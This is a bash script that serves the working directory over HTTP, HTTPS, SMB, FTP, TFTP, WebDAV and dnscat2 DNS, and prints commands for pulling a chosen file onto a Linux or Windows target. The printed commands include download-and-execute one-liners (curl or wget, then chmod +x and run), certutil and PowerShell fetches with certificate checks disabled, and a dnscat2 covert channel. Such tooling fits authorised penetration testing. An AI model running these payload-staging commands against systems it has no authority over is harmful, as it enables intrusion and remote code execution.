#!/usr/bin/env bash
# serve_local.sh
# Serve current directory with multiple protocols (HTTP, HTTPS, SMB, FTP, TFTP, WebDAV, DNS).
# Prints download commands for each selected file.
set -euo pipefail

PORT=80
HTTPS_PORT=443
WEBDAV_PORT=8080
INTERFACE=""
VSFTPD_CONF=""

# Parse arguments
while [[ $# -gt 0 ]]; do
  case $1 in
    -i|--interface)
      INTERFACE="$2"
      shift 2
      ;;
    -p|--port)
      PORT="$2"
      shift 2
      ;;
    *)
      echo "Unknown argument: $1"
      exit 1
      ;;
  esac
done

# Get IP address
get_ip() {
  local iface=$1
  ip -4 addr show "$iface" 2>/dev/null | awk '/inet / {print $2}' | cut -d/ -f1
}

if [[ -n "$INTERFACE" ]]; then
  LOCAL_IP="$(get_ip "$INTERFACE")"
  if [[ -z "$LOCAL_IP" ]]; then
    echo "ERROR: No IPv4 address found on interface '$INTERFACE'."
    exit 1
  fi
else
  echo "Please select an interface:"
  # List all interfaces with IPv4 addresses, excluding lo
  mapfile -t IFACES < <(ip -o -4 addr show | awk '{print $2}' | grep -v 'lo' | sort -u)
  
  if [[ ${#IFACES[@]} -eq 0 ]]; then
    echo "ERROR: No active network interfaces with IPv4 addresses found."
    exit 1
  fi

  for i in "${!IFACES[@]}"; do
    echo "  [$((i+1))] ${IFACES[$i]} ($(get_ip "${IFACES[$i]}"))"
  done

  while true; do
    read -p "Enter number to select interface: " iface_idx
    if [[ "$iface_idx" =~ ^[0-9]+$ ]] && (( iface_idx >= 1 && iface_idx <= ${#IFACES[@]} )); then
      INTERFACE="${IFACES[$((iface_idx-1))]}"
      LOCAL_IP="$(get_ip "$INTERFACE")"
      break
    fi
    echo "Invalid selection."
  done
fi

echo "Using interface $INTERFACE with IP: $LOCAL_IP"
echo

# Collect regular files (non-recursive) in current directory
mapfile -t FILES < <(find . -maxdepth 1 -type f -print0 | xargs -0 -n1 -I{} basename "{}" 2>/dev/null || true)

if [[ ${#FILES[@]} -eq 0 ]]; then
  echo "No regular files found in $(pwd)."
  echo
else
  echo "Files in $(pwd):"
  i=1
  for f in "${FILES[@]}"; do
    echo "  [$i] $f"
    ((i++))
  done
  echo
fi

# Selection logic
SELECTED_FILES=()
if [[ ${#FILES[@]} -gt 0 ]]; then
  while true; do
    read -p "Enter number to select file: " selection
    if [[ "$selection" =~ ^[0-9]+$ ]] && (( selection >= 1 && selection <= ${#FILES[@]} )); then
      SELECTED_FILES=("${FILES[$((selection-1))]}")
      echo "Selected: ${SELECTED_FILES[0]}"
      break
    fi
    echo "Invalid selection. Please enter a number between 1 and ${#FILES[@]}."
  done
  echo
fi

# OS Selection logic
TARGET_OS=""
while true; do
  echo "Target OS:"
  echo "  [1] Linux"
  echo "  [2] Windows"
  read -p "Enter number to select OS: " os_selection
  case "$os_selection" in
    1) TARGET_OS="Linux"; break ;;
    2) TARGET_OS="Windows"; break ;;
    *) echo "Invalid selection. Please enter 1 or 2." ;;
  esac
done
echo "Selected OS: $TARGET_OS"
echo

# Protocol Selection logic
PROTOCOL=""
while true; do
  echo "Select Protocol:"
  echo "  [1] HTTP only"
  echo "  [2] HTTPS only (requires goshs)"
  echo "  [3] SMB only"
  echo "  [4] FTP only"
  echo "  [5] TFTP only"
  echo "  [6] WebDAV only"
  echo "  [7] DNS (dnscat2) only"
  echo "  [8] ALL Protocols (HTTP, HTTPS, SMB, FTP, TFTP, WebDAV, DNS)"
  read -p "Enter number to select protocol: " proto_selection
  case "$proto_selection" in
    1) PROTOCOL="HTTP"; break ;;
    2) PROTOCOL="HTTPS"; break ;;
    3) PROTOCOL="SMB"; break ;;
    4) PROTOCOL="FTP"; break ;;
    5) PROTOCOL="TFTP"; break ;;
    6) PROTOCOL="WebDAV"; break ;;
    7) PROTOCOL="DNS"; break ;;
    8) PROTOCOL="ALL"; break ;;
    *) echo "Invalid selection. Please enter 1-8." ;;
  esac
done
echo "Selected Protocol: $PROTOCOL"
echo

# Port and privilege checks
if [[ "$PROTOCOL" == "HTTP" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
  if [[ "$PORT" -lt 1024 ]] && [[ "$EUID" -ne 0 ]]; then
    echo "WARNING: Port $PORT is privileged and you are not root."
    PORT=8000
    echo "Falling back to port $PORT for HTTP."
  fi
fi

if [[ "$PROTOCOL" == "HTTPS" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
  if [[ "$HTTPS_PORT" -lt 1024 ]] && [[ "$EUID" -ne 0 ]]; then
    echo "WARNING: Port $HTTPS_PORT is privileged and you are not root."
    HTTPS_PORT=8443
    echo "Falling back to port $HTTPS_PORT for HTTPS."
  fi
fi

if [[ "$PROTOCOL" != "HTTP" && "$PROTOCOL" != "WebDAV" ]] && [[ "$EUID" -ne 0 ]]; then
  echo "WARNING: SMB (445), FTP (21), TFTP (69), and DNS (53) usually require root privileges."
fi

# Print download commands per file
echo "========== Download commands (per file) =========="
if [[ ${#SELECTED_FILES[@]} -eq 0 ]]; then
  echo "No files to print commands for."
else
  for f in "${SELECTED_FILES[@]}"; do
    url_encoded="${f//%/%25}"
    url_encoded="${url_encoded//#/%23}"
    url_encoded="${url_encoded// /%20}"
    echo
    echo "File: $f"
    
    if [[ "$TARGET_OS" == "Linux" ]]; then
      if [[ "$PROTOCOL" == "HTTP" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
        echo "  Linux (HTTP):"
        echo "    curl -fsSL \"http://$LOCAL_IP:$PORT/$url_encoded\" -o \"$f\" && chmod +x \"$f\" && ./\"$f\""
        echo "    wget -q --show-progress -O \"$f\" \"http://$LOCAL_IP:$PORT/$url_encoded\" && chmod +x \"$f\" && ./\"$f\""
      fi
      if [[ "$PROTOCOL" == "HTTPS" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
        echo "  Linux (HTTPS - insecure):"
        echo "    curl -k -fsSL \"https://$LOCAL_IP:$HTTPS_PORT/$url_encoded\" -o \"$f\" && chmod +x \"$f\" && ./\"$f\""
        echo "    wget --no-check-certificate -q --show-progress -O \"$f\" \"https://$LOCAL_IP:$HTTPS_PORT/$url_encoded\" && chmod +x \"$f\" && ./\"$f\""
      fi
      if [[ "$PROTOCOL" == "SMB" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
        echo "  Linux (SMB):"
        echo "    smbclient \"//$LOCAL_IP/share\" -c \"get $f\""
      fi
      if [[ "$PROTOCOL" == "FTP" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
        echo "  Linux (FTP):"
        echo "    curl -u anonymous: \"ftp://$LOCAL_IP/$url_encoded\" -o \"$f\""
        echo "    wget \"ftp://$LOCAL_IP/$url_encoded\" -O \"$f\""
      fi
      if [[ "$PROTOCOL" == "TFTP" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
        echo "  Linux (TFTP):"
        echo "    tftp $LOCAL_IP -c get \"$f\""
      fi
      if [[ "$PROTOCOL" == "WebDAV" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
        echo "  Linux (WebDAV):"
        echo "    curl -s \"http://$LOCAL_IP:$WEBDAV_PORT/$url_encoded\" -o \"$f\""
        echo "    cadaver http://$LOCAL_IP:$WEBDAV_PORT/"
      fi
      if [[ "$PROTOCOL" == "DNS" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
        echo "  Linux (DNS/dnscat2):"
        echo "    dnscat2 --dns server=$LOCAL_IP,port=53"
        echo "    (In session: download \"$f\")"
      fi
    elif [[ "$TARGET_OS" == "Windows" ]]; then
      if [[ "$PROTOCOL" == "HTTP" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
        echo "  Windows (HTTP):"
        echo "    certutil -urlcache -split -f \"http://$LOCAL_IP:$PORT/$url_encoded\" \"$f\""
        echo "    curl.exe \"http://$LOCAL_IP:$PORT/$url_encoded\" -o \"$f\""
        echo "    PowerShell -Command \"iwr 'http://$LOCAL_IP:$PORT/$url_encoded' -OutFile '$f'\""
      fi
      if [[ "$PROTOCOL" == "HTTPS" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
        echo "  Windows (HTTPS - insecure):"
        echo "    curl.exe -k \"https://$LOCAL_IP:$HTTPS_PORT/$url_encoded\" -o \"$f\""
        # We use single quotes for echo to prevent bash expansion of $true, and double quotes for PowerShell -Command
        echo "    PowerShell -Command \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor 3072 -bor 768; [Net.ServicePointManager]::ServerCertificateValidationCallback = {\$true}; (New-Object System.Net.WebClient).DownloadFile('https://$LOCAL_IP:$HTTPS_PORT/$url_encoded', '$f')\""
        echo "    PowerShell -Command \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; [Net.ServicePointManager]::ServerCertificateValidationCallback = {\$true}; iwr 'https://$LOCAL_IP:$HTTPS_PORT/$url_encoded' -OutFile '$f'\""
      fi
      if [[ "$PROTOCOL" == "SMB" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
        echo "  Windows (SMB):"
        echo "    net use \\\\$LOCAL_IP\\share /user:smbuser smbpass; cmd.exe /c copy \"\\\\$LOCAL_IP\\share\\$f\" ."
      fi
      if [[ "$PROTOCOL" == "FTP" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
        echo "  Windows (FTP):"
        echo "    curl.exe \"ftp://$LOCAL_IP/$url_encoded\" -o \"$f\""
        echo "    PowerShell -Command \"(New-Object System.Net.WebClient).DownloadFile('ftp://$LOCAL_IP/$f', '$f')\""
      fi
      if [[ "$PROTOCOL" == "TFTP" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
        echo "  Windows (TFTP):"
        echo "    tftp -i $LOCAL_IP GET \"$f\""
      fi
      if [[ "$PROTOCOL" == "WebDAV" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
        echo "  Windows (WebDAV):"
        echo "    (If service error: net start webclient)"
        echo "    cmd.exe /c copy \"\\\\$LOCAL_IP@$WEBDAV_PORT\\DavWWWRoot\\$f\" ."
        echo "    net use Z: \"\\\\$LOCAL_IP@$WEBDAV_PORT\\DavWWWRoot\""
      fi
      if [[ "$PROTOCOL" == "DNS" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
        echo "  Windows (DNS/dnscat2):"
        echo "    dnscat2.exe --dns server=$LOCAL_IP,port=53"
        echo "    (In session: download \"$f\")"
      fi
    fi
  done
fi

echo
echo "=============================================="
echo "Starting server(s)..."

cleanup() {
  echo "Cleaning up..."
  # Kill all background jobs started by this script
  pids=$(jobs -p)
  if [[ -n "$pids" ]]; then
    kill $pids 2>/dev/null || true
    sleep 0.5
    kill -9 $pids 2>/dev/null || true # Force kill if they didn't stop
  fi
  [[ -n "$VSFTPD_CONF" && -f "$VSFTPD_CONF" ]] && rm -f "$VSFTPD_CONF"
}
trap cleanup EXIT

start_http() {
  if command -v goshs >/dev/null 2>&1; then
    echo "Starting goshs HTTP server on port $PORT"
    goshs -p "$PORT"
  elif command -v python3 >/dev/null 2>&1; then
    echo "WARNING: 'goshs' not found. Falling back to 'python3 -m http.server'."
    echo "Starting python3 server on port $PORT"
    python3 -m http.server "$PORT"
  else
    echo "ERROR: Neither 'goshs' nor 'python3' was found in PATH."
    return 1
  fi
}

start_https() {
  if command -v goshs >/dev/null 2>&1; then
    echo "Starting goshs HTTPS server on port $HTTPS_PORT (self-signed)"
    goshs -s -ss -p "$HTTPS_PORT"
  else
    echo "ERROR: 'goshs' is required for HTTPS. (go install github.com/patrickhener/goshs@latest)"
    return 1
  fi
}

start_smb() {
  if command -v impacket-smbserver >/dev/null 2>&1; then
    echo "Starting impacket-smbserver (share: share, user: smbuser, pass: smbpass)"
    impacket-smbserver share "$(pwd)" -smb2support -username smbuser -password smbpass
  elif command -v smbserver.py >/dev/null 2>&1; then
    echo "Starting smbserver.py (share: share, user: smbuser, pass: smbpass)"
    smbserver.py share "$(pwd)" -smb2support -username smbuser -password smbpass
  else
    echo "ERROR: 'impacket-smbserver' not found. (pip install impacket)"
    return 1
  fi
}

start_ftp() {
  if command -v vsftpd >/dev/null 2>&1; then
    VSFTPD_CONF="/tmp/vsftpd.conf.$$"
    echo "listen=YES
listen_ipv6=NO
anonymous_enable=YES
anon_root=$(pwd)
no_anon_password=YES
write_enable=NO
pasv_enable=YES
background=NO
seccomp_sandbox=NO" > "$VSFTPD_CONF"
    echo "Starting vsftpd on port 21 (anonymous root: $(pwd))"
    vsftpd "$VSFTPD_CONF"
  else
    echo "ERROR: 'vsftpd' not found. (apt install vsftpd)"
    return 1
  fi
}

start_tftp() {
  if command -v atftpd >/dev/null 2>&1; then
    echo "Starting atftpd on port 69 (foreground, path: $(pwd))"
    atftpd --daemon --port 69 --no-fork "$(pwd)"
  else
    echo "ERROR: 'atftpd' not found. (apt install atftpd)"
    return 1
  fi
}

start_webdav() {
  if command -v rclone >/dev/null 2>&1; then
    echo "Starting rclone WebDAV on port $WEBDAV_PORT"
    rclone serve webdav "$(pwd)" --addr ":$WEBDAV_PORT"
  else
    echo "ERROR: 'rclone' not found. (apt install rclone)"
    return 1
  fi
}

start_dns() {
  if command -v dnscat2 >/dev/null 2>&1; then
    echo "Starting dnscat2 DNS server on port 53"
    dnscat2 --dns server=$LOCAL_IP,port=53 --no-cache
  else
    echo "ERROR: 'dnscat2' not found. (apt install dnscat2)"
    return 1
  fi
}

# Pre-check: try to free up ports if we are root and have fuser/lsof
if [[ "$EUID" -eq 0 ]] && command -v fuser >/dev/null 2>&1; then
  echo "Pre-cleaning ports..."
  case "$PROTOCOL" in
    HTTP) fuser -k 80/tcp 2>/dev/null || true ;;
    HTTPS) fuser -k 443/tcp 2>/dev/null || true ;;
    SMB)  fuser -k 445/tcp 2>/dev/null || true ;;
    FTP)  fuser -k 21/tcp 2>/dev/null || true ;;
    TFTP) fuser -k 69/udp 2>/dev/null || true ;;
    WebDAV) fuser -k 8080/tcp 2>/dev/null || true ;;
    DNS)  fuser -k 53/udp 53/tcp 2>/dev/null || true ;;
    ALL)
      fuser -k 80/tcp 443/tcp 445/tcp 21/tcp 69/udp 8080/tcp 53/udp 53/tcp 2>/dev/null || true
      ;;
  esac
  sleep 1 # Give the OS a second to release the sockets
fi

case "$PROTOCOL" in
  HTTP)   start_http ;;
  HTTPS)  start_https ;;
  SMB)    start_smb ;;
  FTP)    start_ftp ;;
  TFTP)   start_tftp ;;
  WebDAV) start_webdav ;;
  DNS)    start_dns ;;
  ALL)
    echo "Attempting to start all servers..."
    (start_http || true) &
    (start_https || true) &
    (start_smb || true) &
    (start_ftp || true) &
    (start_tftp || true) &
    (start_webdav || true) &
    start_dns || { echo "WARNING: Foreground DNS server (dnscat2) could not start or was exited. Waiting for background servers..."; wait; }
    ;;
esac
